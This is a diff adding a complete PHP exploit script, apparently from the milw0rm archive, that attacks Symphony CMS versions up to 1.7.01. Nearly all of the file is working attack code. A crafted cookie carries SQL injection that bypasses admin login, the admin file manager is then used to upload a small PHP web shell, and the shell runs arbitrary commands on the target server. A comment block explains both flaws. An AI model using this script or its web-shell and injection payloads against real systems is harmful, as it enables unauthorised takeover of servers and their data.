@@ -1,0 +1,142 @@
+<?php
+## Symphony <= 1.7.01 (non-patched) Remote Command Execution Exploit
+## by Raz0r ( http://Raz0r.name )
+## Software site: http://21degrees.com.au/
+## works regardless magic_quotes_gpc
+
+echo "-----------------------------------------------------------------\n";
+echo "Symphony <= 1.7.01 (non-patched) Remote Command Execution Exploit\n";
+echo "(c)oded by Raz0r (http://Raz0r.name/)\n";
+echo "-----------------------------------------------------------------\n";
+
+if ($argc<3) {
+echo "USAGE:\n";
+echo "~~~~~~\n";
+echo "php {$argv[0]} [url] [cmd]\n\n";
+echo "[url] - target server where Symphony is installed\n";
+echo "[cmd] - command to execute\n\n";
+echo "e.g. php {$argv[0]} http://site.com/ \"ls -la\"\n";
+die;
+}
+
+/*
+i) admin authorization bypass
+vulnerable code in symphony/lib/class.admin.php:
+------------------[source code]----------------------
+function login($username, $password, $already_md5=false, $update=true){
+$sql  = "SELECT *\n";
+$sql .= "FROM `tbl_authors`\n";
+$sql .= "WHERE `username` = '".addslashes($username)."'\n";
+$sql .= "AND `password` = '".(!$already_md5 ? md5($password) : $password)."'\n";
+$row = $this->_db->fetchRow(0, $sql);
+[...]
+}
+[...]
+if(isset($_COOKIE[__SYM_COOKIE__])){
+$args = unserialize($_COOKIE[__SYM_COOKIE__]);
+$result = $this->login($args['username'], $args['password'], true, false);
+}
+------------------[/source code]---------------------
+password value from cookie is not properly sanitized so the code above is vulnerable
+to a SQL-injection which leads to admin authorization bypass.
+
+ii) arbitrary file upload in admin panel
+file manager in admin panel allows arbitrary file upload including php scripts. This vuln
+is actual only for non-patched version, nevertheless the SQL-injection above works on
+patched version too
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",10);
+
+$url = $argv[1];
+$cmd = $argv[2];
+
+$url_parts = parse_url($url);
+$host = $url_parts['host'];
+$path = $url_parts['path'];
+if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
+
+echo "[~] Uploading shell... ";
+exploit($host,$path,$port) ? print("OK\n") : die("Failed\n");
+
+echo "[~] Executing command... ";
+$res = cmd($host,$path,$port,$cmd);
+if ($res) {
+   printf("OK\n%'-65s\n%s%'-65s\n",'',$res,'');
+}else {
+   die("Failed");
+}
+
+function exploit($host,$path,$port) {
+   $ock = fsockopen(gethostbyname($host),$port);
+   if (!$ock) return false;
+
+   $data = "--------bndry31337\r\n";
+   $data.= "Content-Disposition: form-data; ";
+   $data.= "name=\"file\"; filename=\"s.php\"\r\n";
+   $data.= "Content-Type: text/plain\r\n\r\n";
+   $data.= "<?php echo @`{\$_POST['c']}`; ?>\r\n";
+   $data.= "--------bndry31337\r\n";
+
+   $data.= "--------bndry31337\r\n";
+   $data.= "Content-Disposition: form-data; name=\"filter\"\r\n\r\n";
+   $data.= "--------bndry31337\r\n";
+
+   $data.= "--------bndry31337\r\n";
+   $data.= "Content-Disposition: form-data; name=\"destination\"\r\n\r\n";
+   $data.= "workspace/masters/\r\n";
+   $data.= "--------bndry31337\r\n";
+
+   $data.= "--------bndry31337\r\n";
+   $data.= "Content-Disposition: form-data; name=\"action[upload]\"\r\n\r\n";
+   $data.= "Upload\r\n";
+   $data.= "--------bndry31337\r\n";
+
+   $data.= "--------bndry31337\r\n";
+   $data.= "Content-Disposition: form-data; name=\"with-selected\"\r\n\r\n";
+   $data.= "With selected...\r\n";
+   $data.= "--------bndry31337\r\n";
+
+   $packet = "POST {$path}symphony/?page=/publish/filemanager/ HTTP/1.0\r\n";
+   $packet.= "Host: {$host}\r\n";
+   $packet.= "User-Agent: Opera/9.27 (Symphony fucker edition)\r\n";
+   $packet.= "Cookie: sym_auth=a%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22";
+   $packet.= "admin%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%2231337%27+OR+1%3D1+";
+   $packet.= "+LIMIT+1%2F%2A%22%3Bs%3A2%3A%22id%22%3Bi%3A1%3B%7D\r\n";
+   $packet.= "Content-Type: multipart/form-data; boundary=------bndry31337\r\n";
+   $packet.= "Content-Length: ".strlen($data)."\r\n";
+   $packet.= "Connection: close\r\n\r\n";
+
+   $packet.= $data;
+
+   fputs($ock, $packet);
+   $html='';
+   while (!feof($ock)) $html.=fgets($ock);
+
+   return preg_match('@Location: .+?upload-success@',$html) ? true : false;
+}
+
+function cmd($host,$path,$port,$cmd) {
+   $ock = fsockopen(gethostbyname($host),$port);
+   if (!$ock) return false;
+     $data   = "c=".urlencode($cmd);
+     $packet = "POST {$path}workspace/masters/s.php HTTP/1.0\r\n";
+   $packet.= "Host: {$host}\r\n";
+   $packet.= "User-Agent: Opera/9.27 (Symphony fucker edition)\r\n";
+   $packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
+   $packet.= "Content-Length: ".strlen($data)."\r\n";
+   $packet.= "Connection: close\r\n\r\n";
+     $packet.= $data."\r\n";
+     fputs($ock, $packet);
+   $html='';
+   while (!feof($ock)) $html.=fgets($ock);
+     list($headers,$res)=explode("\r\n\r\n",$html);
+   return strlen($res) ? $res : false;
+}
+
+?>
+
+# milw0rm.com [2008-07-31]
